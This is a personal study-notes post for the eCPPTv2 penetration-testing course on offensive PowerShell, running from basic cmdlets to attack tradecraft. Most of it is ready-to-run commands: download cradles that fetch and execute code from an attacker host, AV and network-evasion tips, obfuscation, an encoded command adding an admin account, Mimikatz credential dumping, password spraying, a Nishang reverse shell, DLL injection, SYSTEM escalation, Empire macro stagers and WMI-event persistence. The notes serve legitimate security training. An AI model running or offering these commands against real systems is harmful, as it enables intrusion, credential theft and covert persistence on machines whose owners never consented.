---
title: "3 - Powershell"
classes: single
header:  
  teaser: "/assets/images/posts/2023-11-19-ecppt/ecppt-teaser4.jpg"
  overlay_image: "/assets/images/main/header6.jpg"
  overlay_filter: 0.5  
ribbon: Firebrick
excerpt: "eCPPTv2"
description: "Learn to reduce your footprint and evade defense mechanisms"
categories:
  - notes
  - ecppt
tags:
  - beginner
  - pentest
  - windows
  - powershell
toc: true
---

# Fundamentals

Some Tools:

   → https://github.com/PowerShellMafia/PowerSploit
   → https://github.com/powershell/powershell

## The Powershell CLI
	CLI = Command Line Interface

> powershell path 

```
"%appdata%\Microsoft\Windows\Start Menu\Programs\Windows PowerShell\<v1.0 = version>"
```


	[Environment]::Is64BitProcess
	True

64-bit PowerShell:
```
C:\wIndows\system32\WindowsPowerShell
```

32-bit PowerShell:
```
C:\windows\SysWOW64\WindowsPowerShell
```

### Help Parameter 
```powershell
/? 
-Help
-?
```

### Basic Usage
- ExecutionPolicy
determines which scripts if any, we can run and can easily be disabled with the "Bypass" or "Unrestricted" arguments

```powershell
powershell.exe -ExecutionPolicy Bypass .\script.ps1
powershell.exe -ExecutionPolicy Unrestricted .\script,ps1
```

-WindowStyle
Hides the Powershell window when used the "hidden" argument

```powershell
powershell.exe -WindowStyle Hidden .\script.ps1
```

-Command
Is used to specify a Command or Script Block to run.

```powershell
powershell.exe -Command Get-Process
powershell.exe -Command "& { Get-EventLog -LogName security } "
```

-EncodedCommand
is used to execute base64 encoded scripts or commands

```powershell
powershell.exe -EncodedCommand $encodedCommand
```

-NoProfile
Dont load any powershell profiles
Profiles are essentially scripts that run when the powershell executable is launched and can interfere with our operations.

```powershell
powershell.exe -NoProfile .\script.ps1
```

-Version
we can use followed by a version number as the argument to downgrade the version of powershell
Useful in scenarios where you have landed on a machine with a more recent version and need to downgrade to Version 1.0 or 2.0 to complete certain tasks.

   → Requires that older versions are still installed on the target

```powershell
powershell.exe -Version 2
```

### Abreviations
```powershell
-ExecutionPolicy = -ep / -ex
-EncodedCommand = -ec / -enco
-WindowStyle Hidden = -W h / -Wi hi
```

### Get-Help
Similar to linux **Man Pages**
we can use to obtain information related to any function, alias, module or cmdlet that PowerShell is aware of.

To get full help For any cmdlet, which includes detailed information on associated parameters
```powershell
Get-Help Get-Process -Full
```

To show examples of a specific cmdlet
```powershell
Get-Help Get-Process -Examples
```

To show Help pages online
```powershell
Get-Help Get-Help -Online
```

To update the help files
```powershell
Update-Help
```

   → https://technet.microsoft.com/en-us/library/cc764318.aspx

### Get-Command
it allows us to list all cmdlets, aliases, functions, workflows, filters, scripts and any applications that are available For us to use in PowerShell.
```powershell
Get-Command -Name *Firewall*
```

## Cmdlets
Command-lets
its how we will leverage powershell For our offensive purposes
cmdlets are native commands in powershell (we can also create our own)


Typically used to return output to other cmdlets to be then processed via a pipeline ("|")
	https://www.petri.com/understanding-the-powershell-pipeline

```powershell
Get-ChildItem
```

Returns 4 columns names Mode, LastWriteTime, Length and Name.
But we can pipe the output 
```powershell
Get-ChildItem | Format-List *
```

> rather than columns and names  as seen in the previous slide, we can return all named properties associated with its objects in a different list-like format

### Pipelining
results of all cmdlets output = objects

```powershell
Get-Process | Sort-Object -Unique | Select-Object ProcessName
```

like linux we can redirect the output to a file:
```powershell
Get-Process | Sort-Object -Unique | Select-Object ProcessName > file.txt
```

### Useful Cmdlets & Usage
```powershell
-Get-Process
```

list of all processes
formatted in a table-like format

```powershell
Get-Process | Format-List *
```

To get all of the information (properties) associated with all of the processes

```powershell
Get-Process chrome, firefox | Sort-Object -Unique | Format-List Path
```

Further extend to get information about specific processes and paths to their executables

```powershell
Get-Process chrome, firefox | Sort-Object -Unique | Format-List Path, Id
```

- append another property (id)

### Alias
Most of the cmdlets have **Aliases**. 
example:
```powershell
Get-ChildItem = list items in a directory = ls (exactly like the linux one)
```

To find the aliases we can use: Get-Alias
```powershell
Get-Alias -Definition Get-ChildItem
```

```powershell
// dir // gci // ls
```

### Get-WmiObject

```powershell
Get-WmiObject -class win32_operatingsystem | select -Property *
```

```powershell
Get-WmiObject -class win32_operatingsystem | fl *
```
- using the Format-List alias "fl"

```powershell
Get-WmiObject -class win32_service | fl *
```

detailed list of properties For all services

```powershell
Get-WmiObject -class win32_service | Sort-Object -Unique PathName | fl PathName
```

expanding the filter with PathName

### Export-Csv
saving the information that we are gathering to a file
we can redirect operator (>)
```powershell
Get-WmiObject -class win32_operatingsystem | fl * | Export-Csv C:\file.csv
```

// to save to CSV format

### Exploring the Registry

```powershell
cd HKLM:\
// cd is the alias For the Set-Location
cd .\SOFTWARE\Microsoft\Windows\CurrentVersion\
ls
```

### Select-String

```powershell
Select-String -Path C:\users\user\Documents\*.txt -Pattern pass*
```

// search For .txt files named pass* in a directory

### Get-Content
we can use to display the full content of the file
```powershell

Get-Content C:\Users\user\Documents\passwords.txt

ls -r C:\users\user\Documents -File *.txt | % {sls -Path $_ -Pattern pass* }
ls -r = alias For "Get-ChildItem"
% = alias For "ForEach-Object"
sls = alias For "Select-String"
$_ = variable For current value in the pipeline

```

### Get-Service
Get us information regarding currently installed services and can be useful in the case we can identify a service which might be vulnerable to a privilege escalation exploit.
```powershell
Get-Service "s*" | Sort-Object Status -Descending
```

	// all services that start with "s"


## Modules

- Is a set of powershell functionalities grouped together in the form of a single file that will typically have a ".psm1" file extension.

### The components that can make up a module:
powershell scripts (.ps1)
additional assemblies, help files or scripts
module manifest file
directory which is used to contain all of the above

### Types
script modules:

   → https://docs.microsoft.com/en-us/powershell/scripting/developer/module/how-to-write-a-powershell-script-module?view=powershell-7
binary modules:
   → https://docs.microsoft.com/en-us/powershell/scripting/developer/module/how-to-write-a-powershell-binary-module?view=powershell-7
manifest modules:
   → https://docs.microsoft.com/en-us/powershell/scripting/developer/module/how-to-write-a-powershell-module-manifest?view=powershell-7
dynamic modules: 
   → http://go.microsoft.com/fwlink/?LinkId=141554

### Get-Module
to obtain a list of all currently imported modules 
```powershell
Get-Module
```

To list all modules available to us
```powershell
Get-Module -ListAvailable
```

### Import-Module
modules that we want to use, will first need to be imported into our current powershell session
```powershell
Import-Module .\module.psm1
```

- After importing, all cmdlets of that module is available to us

> [+] example
PowerSploit = https://github.com/PowerShellMafia/PowerSploit

1 - download the module
2 - we need to copy to one of the module paths specified by the **$Env:PSModulePath**.

```powershell
$Env:PSModulePath
// to find these paths
```

> Perhaps the AV will detect the powersploit framework as malicious. its normal.
In this case create an exclude directory For your AV software.


3 - extract and copy all of its contents into our chosen module directory into a folder called 'PowerSploit'
4 - Import the module

```powershell
Import-Module PowerSploit
Get-Module
```

5 - To list all the commands For that module

```powershell
Get-Command -Module PowerSploit
```

6 - There are help files For all of the modules

```powershell
Get-Help Write-HihackDLL
```

## Scripts

	.\example.ps1

```powershell
Param{
	[parameter(mandatory=$true)][string]$file
}
Get-Content "$file"
```

> this script takes a file name as argument For which it creates a variable called "$file", and runs the "Get-Content" cmdlet on our variable.

.\example1.ps1 users.txt
// users.txt contains several usernames, so the script will return the content of the file

### Alternatively
```powershell
	$file="users.txt"
	Get-Content $file
```

> create a variable with the file, then just run getcontent with that variable

### Loops Statements
```powershell
	for()
	foreach()
	while()
	do{something}while()
	do{something}until()
```

### To get more information
```powershell
Get-Help about_<Foreach, For, Do or While>
```

### Loop Statement / Loop Body
```powershell
	$services = Get-Service
	foreach ($service in $services) {$service.name}
```

> returns the name of each service with the **.name** property in the loop body.

### Alternatively
```powershell
	Get-Service | ForEach-Object {$_.name}
```

using the built-in cmdlets ForEach_Object



### Where-Object
allows us to select objects within a collection based on their property values in regard to when used For a loop.

```powershell
Get-ChildItem C:\Powershell\ | Where-Object {$_.name -match "xls"}
```

### Port scan example [+]
```powershell

$ports=(444,81);
$ip="192.168.13.250";

foreach ($port in $ports) {try{$socket=New-Object System.Net.Sockets.TcpClient($ip, $port);}

catch{};

	if ($socket -eq $null) {echo $ip":"$port" - Closed";	} else {echo $ip":"$port" - Open";$socket = $null;}}

.\Scan-Ports.ps1

```

## Objects
```powershell
Get-Process Format-List *
```

- Each objects has a multiple methods that we can use to manipulate a particular object.
- To get a list of methods For objects associated with a cmdlet, we can use get-member

```powershell
Get-Process | Get-Member -MemberType Method
```

1. we have identified an object (in this case, a process **firefox**) we would like to manipulate in some way using the Get-Process cmdlet
2. We have determined the methods that are available For use with the objects that were returned by using: 
```powershell
Get-Process | Get-Member cmdlet and pipeline
```

3. We have decided that the Kill method is the method we would like to use For that process( as an example)

```powershell
Get-Process -Name "firefox" | Kill
```

> we can call the get-process along with the -Name parameter For the firefox process, and pipe the Kill method that we identified using the get-member cmdlet.
This command will kill any firefox processes.

### Creating .NET objects
As an example of creating a basic object based off of a .NET class with the "Net-Object" cmdlet, we can use the "Net.WebClient" .NET system class to download a file to a target system with the following code:

```powershell

$webclient = New-Object System.Net.WebClient
$payload_url = "https://<kali ip>/payload.exe"
$file = "C:\ProgramData\payload.exe"
$webclient.DownloadFile($payload_url, $file)

```

- explainning the code - line by line

1. We create a variable called $webclient which instantiates the System.Net.WebClient .NET class, which is used to create a web client.
2. We then create another variable $payload_url, which is the url to our payload
3. The $file variable is then used as the location to which we want to save the payload on the target system
4. And finally, we call the $webclient variable with the DownloadFile method which downloads our payload.exe to the target.



# Offensive PowerShell

## Downloading and Execution

- A summary of methods we can use For **In-Memory** execution with PowerShell 2.0:

```powershell
Net.WebClient DownloadString Method
Net.WebClient DownloadData Method
Net.WebClient OpenRead Method
.NET [Net.HttpWebRequest] class
Word.Application COM Object
Excel.Application COM Object
InternetExplorer.Application COM Object
MsXml2.ServerXmlHttp COM Object
Certutil.exe w/ -ping argument
```

- A summary of methods we can use For **Disk-Based** execution with PowerShell 2.0:

```powershell
Net.WebClient DownloadFile method
BITSAdmin.exe
Certutil.exe w/ -urlcache argument
```

> These two methods are commonly referred to as **Download Cradles**

### From the PowerShell console
```powershell
iex (New-Object Net.WebClient).DownloadString("http://<kali ip>/script.ps1")
```

   //iex = Invoke-Expression

### From the cmd.exe
we can run the same command from a stardard windows command prompt:

```powershell
powershell.exe iex (New-Object Net.WebClient).DownloadString('http://<kali ip>/script.ps1')

powershell.exe iex (New-Object Net.WebClient).DownloadString("http://10.90.60.80:5923/winpeas.exe")
	//note that when executed within cmd.exe we need to use single quotes
```

### Net.WebClient DownloadString Method
```powershell

$downloader = New-Object System.Net.WebClient
$payload = "http://<kali ip>/script.ps1"
$command = $downloader.DownloadString($payload)
Invoke-Expression $command

```

Instantiate our System.Net.WebClient class as the $downloader variable
Create our $payload variable (URL to the script)
Create our $command variable
Execute our $command with the **Invoke-Expression** (iex) cmdlet


### Example - Download String
save in Get-ProcessPaths.ps1
```powershell
Get-Process | Format-List -Property Name, Path
```

Host in a web server
Then:
```powershell
iex (New-Object Net.WebClient).DownloadString("http://<kali ip>/Get-ProcessPaths.ps1")
```

- The DownloadString method will execute our remote script in the PowerShell process memory, so in regard to not dropping an artifact to disk, its a great way to stay under the radar of endpoint security solutions that are not monitoring powershell memory.

> Evasion Tips [+]
It should be noted that where possible when hosting your remote PowerShell script, to have an SSL certificate configured on the attacker machine.
This helps in evading over-the-wire heuristics as our traffic will go over HTTPS.
In the previous examples, we simply used HTTP, which could easily be detected.


> Evasion Tips [+]
Another trick we can use which might help in evading basic file extension heuristics is to give our Powershell script a different extension, For instance **Logo.gif**. PowerShell will still execute it as a .ps1 script

```powershell
iex (New-Object Net.WebClient).DownloadString("http://<kali ip>/Logo.gif")
```

> Evasion Tips [+]
Net.WebClient class allows us to specify a custom user-agent string when sending the request to our attacker URL.
This can help us evade detection mechanisms that are flagging on abnormal user-agent strings crossing the wire.
We can do that with the **Headers.Add** method:

```powershell

$downloader.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36")
	// we can insert that in the second line of our code. Just after declaring the $downloader variable

```

### Example - DownloadFile
This method will download your executable to disk
Although noisy and not recommended if trying to remain stealthy, its still sometimes a handy method to quickly download a file to the target system.

```powershell

$downloader = New-Object System.Net.WebClient
$payload = "http://<kali ip>/payload.exe"
$local_file = "C:\programdata\payload.exe"
$downloader.DownloadFile($payload, $local_file)

```

Instantiate our System.Net.WebClient class as the $downloader variable
payload URL variable
local_file variable (will save to this location)
Call the object variable with the "DownloadFile" method and our $payload and $local_file variables

- Executing the file once its on our target system can be accomplished using the call operator (&) and variable we created For the payload ($local_file)

```powershell
& $local_file
```

#### [+]
We can configure the Net.WebClient class methods to use the systems proxy and default credentials
```powershell

$downloader = New-Object System.Net.WebClient
$payload = http://<kali ip>/script.ps1
$cmd = $downloader.DownloadFile($payload)

$proxy = [Net.WebRequest]::GetSystemWebProxy()
$proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
$downloader.Proxy = $proxy

iex $cmd

```

#### Net.WebRequest
To download and execute scripts on a target, in memory
```powershell

$req = [System.Net.WebRequest]::Create("http://<kali ip>/script.ps1")
$res = $req.GetResponse()
iex ([System.IO.StreamReader]($res.GetResponseStream())).ReadToEnd()

```

Instantiate our System.Net.WebRequest class as the $req variable
Create a $res variable to store the WebRequest response
Use the "Invoke-Expression" alias (iex) to invoke the System.IO.StreamReader and execute our code

> It can also be configured to use a proxy
we can add this before the iex line

```powershell

$proxy = [Net.WebRequest]::GetSystemWebProxy()
$proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
$req.Proxy = $proxy
```

#### System.Xml.XmlDocument
Allow us to execute a powershell command or any system command (in memory)
```powershell

Create a XML file:
<?xml version="1.0"?>
<command>
	<a>
		<execute>Get-Process</execute>
	</a>
</command>

```

once our xml file is hosted
```powershell

$xmldoc = New-Object System.Xml.XmlDocument
$xmldoc.Load("http://<kali ip>/file.xml")
iex $xmldoc.command.a.execute

```

#### COM Objects
some available
```powershell

Msxml2.XMLHTTP
Microsoft.XMLHTTP
InternetExplorer.Application
Excel.Application
Word.Application
MsXml2.ServerXmlHttp
WinHttp.WinHttpRequest.5.1 (Not Proxy Aware)
```

> it works the same but the New-Object, with **-ComObject** parameter

```powershell

$downloader = New-Object -ComObject Msxml12.XMLHTTP
$downloader.open("GET", "http://<kali ip>/script.ps1", $false)
$download.send()
iex $downloader.responseText
```

- We can do the same with WinHttp.WinHttpRequest.5.1 object as well (in the first line)

```powershell

$downloader = New-Object -ComObject WinHttp.WinHttpRequest.5.1
```

> Tip [+]
We can use all these commands as one liners, by using a semicolon (;) to break ip the commands
We can save as script too and execute with **powershell.exe .\script.ps1** 
Make sure to include -ExecutionPolicy (-ep) and -Window Hidden (-W h)
This will ensure we can run our scripts and that the powershell window stays hidden from the end-user

```powershell
powershell.exe -ExecutionPolicy bypass -Window hidden .\downloader.ps1
```

> [ extra ]
A great tool to craft obfuscated download cradles:

```powershell
Invoke-CradleCrafter = https://github.com/danielbohannon/Invoke-CradleCrafter
```




## Obfuscation

Invoke-Obfuscation = https://github.com/danielbohannon/Invoke-Obfuscation

```
- First download
- Then, find the modules paths
   → $env:PSModulePath
	// in this case C:\users\user\Documents\WindowsPowerShell\Modules
	// After extract to this folder
- Import the module
   → Import-Module Invoke-Obfuscation
- Open it
   → Invoke-Obfuscation
```

### We have several options
```
TOKEN
AST
STRING
ENCODING
COMPRESS
LAUNCHER
```

### SET SCRIPTBLOCK

As an example of a script block we can use a standard Net.WebClient download cradle:
```powershell
SET SCRIPTBLOCK iex (New-Object Net.WebClient).downloadstring("http://<kali ip>/Get-ProcessPath.ps1")
```

### Type of Obfuscation

#### STRING

We are presented with several options For that method:
	1. Concatenate
	2. Reorder
	3. Reverse

In this example **3**
→ 3

> we should get a code obfuscated that we can use in the target machine

#### Encoding

// We are presented with options
1. Encode as ASCII
2. Encode as Hex
3. Encode as Octal
4. Encode as Binary
5. Encrypt as SecureString (AES)
6. Encode as BXOR
7. Encode as Special Characters
8. Encode as Whitespace

- Lets pick **7** - Special Characters, For this example
 → 7

we should get a highly obfuscated payload

> [+] If we are operating from a windows command prompt on the target, instead of powershell. We can use:

```powershell
powershell -Command "<the same payload>"
```
// dont forget the quotes in the payloads

> If you wanna use another encoding method, use the RESET options to clear previous methods.

### Obfuscated launcher
 → LAUNCHER
there is a lot of options:

```
ps
cmd
wmic
rundll
var+
stdin+
clip+
var++
stdin++
clip++
rundll++
mshta++
```

1. We SET SCRIPTBLOCK with the code we want to execute
2. We select an obfuscation method to generate the obfuscated command
3. We then use the LAUNCHER option at the end of this process

in this case we will choose 
→ RUNDLL

then option **0** - No execution flags
→ 0

The resulting string, is an obfuscated command that utilizes rundll32.exe with the "SHELL32.DLL" function (ShellExec_RunDLL) which will launch our obfuscated powershell code on the target.

> [+] There is an option: **tutorial** that we can use to get some guidance if we are stuck


### Encoded Commands
its not recommended since it can be easily detected by AV and other string heuristics, considering its just a base64 encoding.

-EncodedCommand parameter in powershell
	it makes complex commands **digestible** by powershell by encoding everything with Base64.

#### example
```powershell

$command = 'net user admin1 "password" /ADD; net localgroup administrators admin1 /add'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)

```

we can get the results of our encoded command with:
```powershell
→ Write-Host $encodedCommand
```

//copy the payload

then execute on the target:
```powershell
powershell.exe -encodedcommand <paste the payload>
```


## Information Gathering & Recon

Invoke-Portscan = https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1
its included with the powersploit framework
```powershell
Invoke-Portscan -Hosts "192.168.13.1/24" -PingOnly
Invoke-Portscan -HostFile ips.txt -PingOnly
```

- to save the results we can pipe and export-csv
```powershell
Invoke-Portscan -HostFile ips.txt -PingOnly | Export-Csv C:\ping_scan.csv
```

once we have identified live hosts
we can conduct port scans
```powershell
Invoke-Portscan -HostFile ips.txt -ports "53-81"
```

### Output to .gnmap = NMAP format
```powershell
Invoke-Portscan -HostFile ips.txt -oG port_scan.gnmap -f -ports "1-81"
```

### For enumerating Files

Get-HttpStatus
```powershell
Get-HttpStatus -Target 192.168.13.62 -Path dictionary.txt -Port 80 | ? {$_.Status -match "ok"}
```

### Host Discovery with Posh-SecMod framework
Invoke-ARPScan = https://github.com/darkoperator/Posh-SecMod

it may generate fewer alerts than your usual SYN or TCP scan
```powershell
Invoke-ARPScan -CIDR 192.168.13.1/24
```

Get-Command -Module Posh-SecMod
// to view the available options

### DNS related
```powershell
Invoke-ReverseDnsLookup -CIDR 192.168.13.0/24
Get-Help Resolve-HostRecord -Examples
Get-Help Resolve-DNSRecord -Examples
```


## Post-Exploitation with PowerShell

post-exploitation framework Nishang = https://github.com/samratashok/nishang

// as always, download the framework and host with a web server


- Nishang


### Copy-VSS module
will attempt to copy the SAM database using VSS service, and if run on a domain controller, will try and copy the NTDS.dit and contents of the system registry hive.

```powershell
iex (New-Object Net.WebClient).DownloadString("http://<kali ip>/Copy-VSS.ps1"); Copy-VSS
```

### Get-Information
get a lot of system information

```powershell
iex (New-Object Net.WebClient).DownloadString("http://<kali ip>/Get-Information.ps1"); Get-Information
```

### Get-PassHints
we can use to dump the saved password hints For users on the system:

```powershell
iex (New-Object Net.WebClient).DownloadString("http://<kali ip>/Get-PassHints.ps1"); Get-PassHints
```

### Invoke-Mimikatz
 Will dump clear-text credentials or hashes from memory.

```powershell
iex (New-Object Net.WebClient).DownloadString("http://<kali ip>/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -DumpCreds
```

> There is plenty more in Nishang **gather** modules
moreover = https://github.com/samratashok/nishang#gather

### Invoke-BruteForce
We can use this to brute force Active Directory accounts, SQL Server, Web or FTP servers.
Invoke-BruteForce is great tool For executing a password spray attack against Active Directory
Just ensure that your password list contains a single password.

→ Get-Help Invoke-BruteForce

```powershell
Invoke-BruteForce -ComputerName targetdomain.com -UserList C:\temp\users.txt -PasswordList C:\temp\pwds.txt -Service ActiveDirectory -StopOnSuccess -Verbose
```

### Reverse Shell - Invoke-PowerShellTcp 
provides a way to obtain a reverse PowerShell from our target host back to a netcat listener
the traffic is traversing the wire in cleartext between attacker and target.
although a great and undetected by AV method to get a reverse shell from PowerShell, over-the-wire (SIEM) may pick up some chatter if that type of solution has been implemented within an organization.

- Open a listener in the attacker:

```bash
nc -lvnp 4444
```
- Execute the command in the target to grab the file and get the reverse shell:

```powershell
powershell.exe -Command iex (New-Object Net.WebClient).DownloadString("http://<kali ip>/Invoke-PowerShellTcp.ps1"); Invoke-PowerShellTcp -Reverse -IPAddress <kali ip> -Port 4444
```


- There is a lot more shells available in Nishang framework.
// bind, reverse, ICMP, UDP, RAT, etc
```powershell
Invoke-JSRatRegsvr.ps1
Invoke-JSRatRundll.ps1
Invoke-PoshRatHttp.ps1
Invoke-PoshRatHttps.ps1
Invoke-PowerShellIcmp.ps1
Invoke-PowerShellTcp.ps1
Invoke-PowerShellTcpOneLine.ps1
Invoke-PowerShellTcpOneLineBind.ps1
Invoke-PowerShellUdp.ps1
Invoke-PowerShellUdpOneLine.ps1
Invoke-PsGcat.ps1
Invoke-PsGcatAgent.ps1
Remove-PoshRat.ps1
```


- Nishang has other categories modules as well:

```powershell
ActiveDirectory
Antak-WebShell
Backdoors
Bypass
Client
Escalation
Execution
Gather
MITM
Misc
Pivot
Prasadhak
Scan
Shells
Utility
```

- PowerSploit

Tools For post-exploitation:
```powershell
AntivirusBypass
Code Execution
Exfiltration
Mayhem
Persistence
Privesc
Recon
ScriptModification
```

### PowerUp
its a module within the Privesc Category
we can first import the Privesc module from within the Privesc modules directory and have a look at some of the options we have:

```powershell
C:\Modules\PowerSploit\Privesc> Import-Module .\Privesc.psm1
Get-Command -Module Privesc
```

- Invoke-AllChecks:
// will run all functions related to the Privesc module looking For misconfigurations, permissions issues with services, opportunities For DLL hijacking a number of other useful checks.

// We can invoke it on the target after we have imported the Privesc.psm1 module with the "Invoke-AllChecks" command.

```powershell
C:\Modules\PowerSploit\Privesc> Invoke-AllChecks
```

The output will also indicate an **AbuseFunction** we can use to further exploit the target. 
In this case, PowerUp identified a potential service binary we can install with the "Install-ServiceBinary -Name 'ClickToRunSvc' command"

### PowerSploit - Save to HTML
the file will be saved in the current directory MACHINENAME.USERNAME.html
```powershell
Invoke-AllChecks - HTMLReport
```

### CodeInjection category
we can inject our own code into existing processes on the target system, whether it be via DLL injection, injecting our own custom Shellcode into an existing process, or using WMI to execute commands on the target.

### Invoke-DLLInjection
this function injects an attacker-defined DLL into any existing process ID on the target system.

```bash
msfvenom -p windows/exec CMD="cmd.exe" -f dll > cmd.dll
```

open a web host:
grab the file:
```powershell
iex (New-Object Net.Webclient).DownloadFile('http://<kali ip>/cmd.dll', 'C:\programdata\cmd.dll')
```

- Identify a process on the target system we would like to inject our DLL into.

```powershell
ps | ? {$_.ProcessName -match "notepad"}
```


- After grabbing the PID of the choosen process
We can grab the Invoke-DLLInjection and execute it to inject our malicious dll in the PID of the process

```powershell
iex (New-Object Net.Webclient).DownloadString('http://<kali ip>/Invoke-DLLInjection.ps1'); Invoke-DLLInjection -ProcessID 7420 C:\programdata\cmd.dll
```

- once that in complete, we can run "ps" command again, to confirm that we have a "cmd" process which has been spawned from our DLL injection operation, which is created in a new process thread.

```powershell
ps | ? {$_.ProcessName -match "cmd"}
```

### More about DLL injection
	http://blog.opensecurityresearch.com/2013/01/windows-dll-injection-basics.html


- psgetsystem

// another tool

	https://github.com/decoder-it/psgetsystem

psgetsystem allows us to get SYSTEM privileges via a parent process, which then spawns a child process which effectively inherits the SYSTEM access privileges of the parent.
Although this tool needs to be run as Administrator, its a great way to evade application whitelisting solutions by being to inject ourselves into an already signed or other trusted process.

After send the script to the target
```powershell
	. .\psgetsys.ps1
	[MyProcess]::CreateProcessFromParent(<system_id>, "<Command to execute>")
```

- First we need to identify some SYSTEM processes

```powershell
Get-Process -IncludeUserName | Where-Object {$_.UserName -match "SYSTEM"} | Format-List -Property Username,Name,Id
```

This should return a list of all SYSTEM-owned processes along with their PIDs and process names.
in this case we will use **ZeroConfigService**

- This will launch a cmd.exe prompt, but as a child process of the SYSTEM-owned ZeroConfigService.exe process, and as a result, our **child** process, will also be SYSTEM.

```powershell
	. .\psgetsys.ps1
	[MyProcess]::CreateProcessFromParent(3632,"cmd.exe")
```

> we can confirm this by running a tool like Process Explorer, to see that our cmd.exe process has been spawned as a child process of the ZeroConfigService process and is also SYSTEM.

> of course, in an attack scenario, we could launch a meterpreter executable payload as SYSTEM and get a SYSTEM shell from the target machine.


- Empire

	https://github.com/EmpireProject/Empire

> Another post-exploitation framework
Its main advantage is that is implements powershell functionality without requiring the existence of powershell on a target machine.



## Powershell and Metasploit


set a handler in meterpreter
make a payload in msfvenom = -f psh-reflection > payload.ps1
make a web host to send the payload to the target
```python
	python -m http.server
```

grab the file in the target machine:
```powershell
powershell iex (New-Object Net.Webclient).DownloadString('http://<kali ip>/payload.ps1')
```

> once we execute the download cradle, we will receive the meterpreter session already


in meterpreter session:

	load powershell
	help = to show the options we have
	powershell_shell

```powershell
Get-Process | Where-Object {$_.ProcessName -match "iTunes"}
```

back to meterpreter:
```powershell
powershell_execute 'iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1"); Invoke-Mimikatz'
```

> it has the advantage that operates in the powershell memory, helping us to stay undetected.


### sending Empire session to Metasploit
in msfconsole:
	exploit/multi/script/web_delivery
	set srvhost = kali ip
	set lhost = kali ip
	set target 2 = PSH *powershell
	run
	copy the URL of the payload 

in Empire:
	usemodule powershell/cpde_execution/invoke_metasploitpayload
	info
	set URL <paste the URL of the metasploit payload>
	set Agent 65CY4XEG
	execute
	// Now it should open a session in metasploit



## Empire Overview

### Install
- https://github.com/EmpireProject/Empire

```powershell
git clone <url>
cd Empire > cd setup > ./install.sh
```

### Handlers
```powershell
listeners
help
uselistener
userlistener <option of choice>
info = to show options
```

### config to use SSL
```powershell
cd /root/tools/Empire/setup/
./cert.sh
```

in Empire:
set CertPath /root/tools/Empire/data
execute = run/exploit (metasploit)
back = same as (metasploit)


BindIP = lhost (metasploit)
Port = lport (metasploit)

- Verify
listeners
now our listener should appear

### set Stager
```powershell
usestager = it will show the options
usestager multi/launcher
info = to show options
set Listener http
execute
copy the payload to execute in the target machine
```

### Agents
After executing the payload in the target, we should have an agent in Empire = same as session in metasploit

```powershell
agents = it will show the open session
help
interact <tab> choose an option = same as session -i <number> (metasploit)
```

### In Empire Session
```powershell
help = always to show the available options
info = same as sysinfo (metasploit)
shell = to use commands

shell whoami
shell whoami /GROUPS
usemodule
searchmodule checks

usemodule privesc/powerup/allchecks
execute
```

### Client side attack
```powershell
main = to come back to the main menu
usestager windows/macro
info
set Listener http
set OutFile root/tools/Empire/data/macro
execute 
```

the macro code will be save in that directory
we can copy-paste the macro to a word document
make sure that you enable developer tab For your version of microsoft word
alt+f11 = to open the visual basic 
copy the payload to the editor
save the file .doc

> as the result of the macro execution in the target machine, we get a session in Empire


## UAC Bypass PowerShell Exploit Script Walkthrough

- Identify the program that which auto elevates to a high integrity process, which naturally bypass UAC in a sense.
- Identify that the program checks For registry keys and values which are writable by us
- and its responsable to associate file types of the msi extension to a specific application
- we also hijack that process, to launch a command of our choosen, which was the calculator program.


### Introduction to Leveraging WMI and Methods For Persistence
```powershell
Get-WmiObject
Get-Help Get-WmiObject
Get-Help wmi

Get-WmiObject -Namespace "root/cimv2" -Class "__Namespace"
Get-WmiObject -Namespace "root/cimv2" -Class "__Namespace" | Select-Object Name
Get-WmiObject -Namespace "root/cimv2" -List | Where-Object {$_.Name -Match "Win32_Service"}
Get-WmiObject -Class Win32_Service | Where-Object {$_.State -Match "Running"}
Get-WmiObject -Class Win32_Service | Where-Object {$_.Name -Match "Defend"}
Get-WmiObject -Class Win32_Process -List
Get-WmiObject -List Win32_Process | Get-Member -Membertyoe Method
```

```powershell

$proc = Get-WmiObject -List Win32_Process
$proc.Create("cmd.exe")

```

> this should launch cmd.exe as a child process from WmiProvider

```powershell
Invoke-WmiMethod -Class Win32_Process -Name create -ArgumentList cmd.exe
```

// Also will generate a process as a child from the WmiProvider

```powershell
Invoke-WmiMethod -Class Win32_Process -Name create -ArgumentList cmd.exe -ComputerName <ip> -Credential <user>
```

```powershell
Get-WmiObject -Class Win32_Process -Filter {ProcessId ="2512"} -Computername <ip> -Credential <user>
```

```powershell
Get-WmiObject -Class Win32_Process -Filter {ProcessId ="2512"} -Computername <ip> -Credential <user> | Remove-WmiObject
```

// if we want to kill the process remotely


### PowerLurk
https://github.com/Sw4mpf0x/PowerLurk

- make a payload in msfvenom
- send to the target machine via python web server host
- open a handler in metasploit
- download the PowerLurk.ps1 from github
- execute this command to grab the PowerLurk file and trigger with a program, in this case the calc.exe. 
// Everytime the target execute the calculator our payload will be executed.

```powershell
iex (New-Object Net.WebClient).DownloadString('http://<kali ip>/PowerLurk.ps1'); Register-MaliciousWmiEvent -EventName CalcExec -PermanentCommand "cmd.exe /c C:\programdata\payload.exe" -Trigger ProcessStart -ProcessName calc.exe
```

- To view our malicious WMI Event

```powershell
iex (New-Object Net.WebClient).DownloadString('http://<kali ip>/PowerLurk.ps1'); Get-WmiEvent -Name CalcExec
```

> now its up to the target user, to open the calculator 
it will trigger the reverse shell back to our kali 

### if you wanna Remove the Malicious WMI Event
```powershell
iex (New-Object Net.WebClient).DownloadString('http://<kali ip>/PowerLurk,ps1'); Get-WmiEvent -Name CalcExec | Remove-WmiObject
```




## Lab 1 - Leveraging PowerShell During Exploitation

organization - 172.16.80.0/24
172.16.80.1
172.16.80.100
tester ip = 175.12.80.0/24

#
my ip 175.12.80.10
#
172.16.80.1
172.16.80.100
	135
	139
	445
	4983

> we can access in browser or by nc

```powershell

172.16.80.100:4983 or nc 172.16.80.100 4983
